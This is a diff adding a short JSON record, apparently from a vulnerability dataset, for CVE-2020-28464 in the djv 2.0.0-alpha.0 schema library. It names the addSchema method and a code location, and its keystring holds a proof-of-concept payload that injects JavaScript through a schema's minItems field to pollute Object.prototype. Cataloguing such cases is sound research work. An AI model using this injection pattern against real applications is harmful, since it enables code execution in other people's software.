@@ -1,0 +1,8 @@
+{
+  "id": "CVE-2020-28464",
+  "upstream": "djv@2.0.0-alpha.0",
+  "keymethod": "addSchema",
+  "keystring": "{\"common\":{\"type\":\"array\", \"minItems\":\"1 + (Object.prototype.polluted = `yes`)\"}}",
+  "location": "lib/utils/template.js:110:15",
+  "downstreams": []
+}
